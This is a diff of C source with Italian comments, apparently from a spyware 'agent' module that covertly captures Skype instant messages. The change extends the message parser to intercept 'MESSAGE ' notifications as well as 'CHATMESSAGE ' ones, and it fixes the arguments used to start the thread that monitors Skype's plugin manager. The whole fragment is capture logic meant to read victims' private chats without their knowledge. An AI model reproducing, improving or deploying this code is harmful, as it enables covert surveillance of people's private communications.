@@ -235,7 +235,7 @@ DWORD __stdcall PM_IMDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILETIME *t
 	if (dwFlags == FLAGS_SKAPI_MSG) {
 		NullTerminatePacket(dwLen, msg);
 		// Se e' una notifica di messaggio...
-		if (!strncmp((char *)msg, "CHATMESSAGE ", strlen("CHATMESSAGE "))) {
+		if (!strncmp((char *)msg, "CHATMESSAGE ", strlen("CHATMESSAGE ")) || !strncmp((char *)msg, "MESSAGE ", strlen("MESSAGE "))) {
 			DWORD direction;
 			char *msg_ptr, *message_id;
 		
@@ -247,7 +247,11 @@ DWORD __stdcall PM_IMDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILETIME *t
 				*msg_ptr = 0;
 			} else
 				return 0;
-			message_id = (char *)msg + strlen("CHATMESSAGE ");
+
+			if (!strncmp((char *)msg, "CHATMESSAGE ", strlen("CHATMESSAGE ")))
+				message_id = (char *)msg + strlen("CHATMESSAGE ");
+			else
+				message_id = (char *)msg + strlen("MESSAGE ");
 
 			// Verifica che non ci sia gia' questo messaggio in lista
 			for (i=0; i<SKYPE_MESSAGE_BACKLOG; i++) {
@@ -385,7 +389,7 @@ DWORD __stdcall PM_IMStartStop(BOOL bStartFlag, BOOL bReset)
 		// Crea il thread che esegue gli IM
 		hIMThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)IMCaptureThread, NULL, 0, &dummy);
 		// Crea il thread che monitora skypepm
-		hIMSkypePMThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorSkypePM, NULL, 0, (DWORD *)&bPM_imspmcp);
+		hIMSkypePMThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorSkypePM, (DWORD *)&bPM_imspmcp, 0, 0);
 	} else {
 		// All'inizio non si stoppa perche' l'agent e' gia' nella condizione
 		// stoppata (bPM_IMStarted = bStartFlag = FALSE)
